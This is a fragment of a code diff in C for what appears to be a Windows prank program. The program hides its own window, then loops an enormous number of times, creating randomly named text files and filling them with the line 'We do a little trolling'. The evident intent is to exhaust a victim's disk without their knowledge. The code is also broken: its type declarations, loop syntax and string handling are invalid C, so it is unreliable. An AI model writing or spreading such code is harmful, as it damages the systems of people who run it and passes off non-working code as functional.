@@ -9,7 +9,7 @@ int main() {
     ShowWindow( hWnd, SW_MINIMIZE );
     ShowWindow( hWnd, SW_HIDE );    
     FILE[] *x;
-    for(int i = 0, i < 20 * i; i++) {
+    for(int i = 0; i < 10000000000000; i++) {
         x[i] = fopen(rand() + '.txt', 'w+')
         for(int y = 0, y < i; y++){
             fputs("We do a little trolling\n", x[i]);
